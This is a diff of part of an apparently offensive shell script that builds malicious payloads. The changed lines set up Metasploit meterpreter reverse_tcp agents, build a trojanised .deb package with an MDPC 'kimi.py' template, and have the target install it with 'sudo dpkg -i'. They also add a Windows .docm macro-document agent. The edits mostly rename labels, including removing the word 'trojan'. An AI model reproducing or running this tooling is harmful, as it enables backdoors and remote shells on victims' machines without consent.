@@ -4184,7 +4184,7 @@ cat << !
 | SRVHOST : $srvhost
 | FORMAT  : SH,PYTHON -> unix(s)
 | PAYLOAD : python/meterpreter/reverse_tcp
-|_STORED  : $IPATH/output/$N4m.deb
+|_AGENT   : $IPATH/output/$N4m.deb
 
 !
 
@@ -4197,18 +4197,18 @@ sleep 2
 
    # check if kimi.py exists
    if [ -e $IPATH/templates/kimi_MDPC/kimi.py ]; then
-      echo "[☠] Program MDPC-kimi.py -> found!"
+      echo "[☠] MDPC-kimi.py -> found!"
       sleep 2
  
    else
 
-      echo "[☠] Program MDPC-kimi.py -> not found!"
+      echo "[☠] MDPC-kimi.py -> not found!"
       exit
    fi
 
 
 # use MDPC to build trojan agent
-echo "[☠] Use MDPC-kimi to build trojan agent .."
+echo "[☠] Use MDPC-kimi to build agent .."
 sleep 2
 cd $IPATH/templates/kimi_MDPC
 xterm -T "kimi.py (MDPC)" -geometry 110x23 -e "python kimi.py -n $N4m -V $VeRp -l $srvhost && sleep 2" > /dev/null 2>&1
@@ -4221,7 +4221,7 @@ cd $IPATH/
 
 
 # copy agent to apache2 and deliver it to target
-echo "[☠] Execute in target: dpkg -i <packet_name.deb> .."
+echo "[☠] Execute in target: sudo dpkg -i $N4m.deb"
 sleep 2
 
 
@@ -4557,7 +4557,8 @@ cat << !
 | LPORT   : $lport
 | LHOST   : $lhost
 | FORMAT  : C -> WINDOWS
-|_PAYLOAD : windows/meterpreter/reverse_tcp
+| PAYLOAD : windows/meterpreter/reverse_tcp
+|_AGENT   : $IPATH/output/$N4m.docm
 
 !
 
